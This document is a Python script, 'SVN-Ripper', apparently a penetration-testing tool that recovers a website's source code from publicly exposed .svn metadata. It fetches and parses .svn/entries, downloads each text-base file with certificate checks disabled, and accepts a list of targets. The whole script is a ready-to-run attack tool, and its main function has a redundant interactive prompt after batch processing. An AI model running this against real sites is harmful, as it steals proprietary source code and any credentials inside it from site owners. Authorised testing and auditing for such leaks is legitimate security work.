#!/usr/bin/env python3
# Licence: MIT
# Copyright (c) 2025 Dardan Prebreza / Pretera

import requests
import os
import gzip
from urllib.parse import urljoin
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_logo():
    print("""

███████╗██╗   ██╗███╗   ██╗      ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██║   ██║████╗  ██║      ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████╗██║   ██║██╔██╗ ██║█████╗██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
╚════██║╚██╗ ██╔╝██║╚██╗██║╚════╝██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████║ ╚████╔╝ ██║ ╚████║      ██║  ██║██║██║     ██║     ███████╗██║  ██║
╚══════╝  ╚═══╝  ╚═╝  ╚═══╝      ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                   
              SVN-Ripper | Pretera.com
        Recover source from leaked .svn metadata
""")


def fetch_entries(url):
    entries_url = urljoin(url, '.svn/entries')
    print(f'[+] Fetching entries from: {entries_url}')
    response = requests.get(entries_url, verify=False)
    if response.status_code != 200:
        print('[-] Failed to fetch entries. HTTP', response.status_code)
        return None
    return response.text

def parse_entries(entries_content):
    lines = entries_content.splitlines()
    files = []
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        if not line or line.startswith('<?xml'):
            i += 1
            continue
        if i + 1 < len(lines) and lines[i+1].strip() in ['file', 'dir']:
            filename = line
            file_type = lines[i+1].strip()
            if file_type == 'file' and not filename.endswith('/'):
                files.append(filename)
            i += 4
        else:
            i += 1
    return list(set(files))

def try_decode(data):
    try:
        return gzip.decompress(data).decode('utf-8')
    except:
        try:
            return data.decode('utf-8')
        except:
            return None

def download_and_decode(base_url, filepath, outdir='recovered'):
    os.makedirs(outdir, exist_ok=True)
    svn_url = urljoin(base_url, f'.svn/text-base/{filepath}.svn-base')
    output_path = os.path.join(outdir, filepath)

    print(f'[+] Downloading: {svn_url}')
    r = requests.get(svn_url, verify=False)
    if r.status_code != 200:
        print(f'[-] Failed to download {filepath} (HTTP {r.status_code})')
        return

    content = try_decode(r.content)
    if content:
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f'[+] Saved decoded file: {output_path}')
    else:
        print(f'[-] Could not decode: {filepath}')


def main():
    print_logo()
    parser = argparse.ArgumentParser(description='SVN-Ripper - Extract source code from .svn metadata')
    parser.add_argument('-u', '--url', help='Target base URL (e.g., https://target.com/)', required=False)
    parser.add_argument('-l', '--list', help='File containing list of target URLs', required=False)
    parser.add_argument('-o', '--out', help='Output directory (default: recovered)', default='recovered')
    args = parser.parse_args()

    targets = []
    if args.url:
        targets.append(args.url.strip())
    elif args.list:
        with open(args.list) as f:
            targets = [line.strip() for line in f if line.strip()]

    if not targets:
        print('[-] Please provide either -u or -l.')
        parser.print_help()
        return

    for base_url in targets:
        print(f"\n[+] Processing: {base_url}")
        entries = fetch_entries(base_url)
        if not entries:
            continue
        files = parse_entries(entries)
        print(f'[+] Found {len(files)} files:')
        for f in files:
            print('  -', f)
        for f in files:
            download_and_decode(base_url, f, args.out)

    print_logo()
    base_url = input('Enter target base URL (e.g., https://target.com/): ').strip()
    entries = fetch_entries(base_url)
    if not entries:
        return

    files = parse_entries(entries)
    print(f'[+] Found {len(files)} files:')
    for f in files:
        print('  -', f)

    for f in files:
        download_and_decode(base_url, f)

if __name__ == '__main__':
    main()
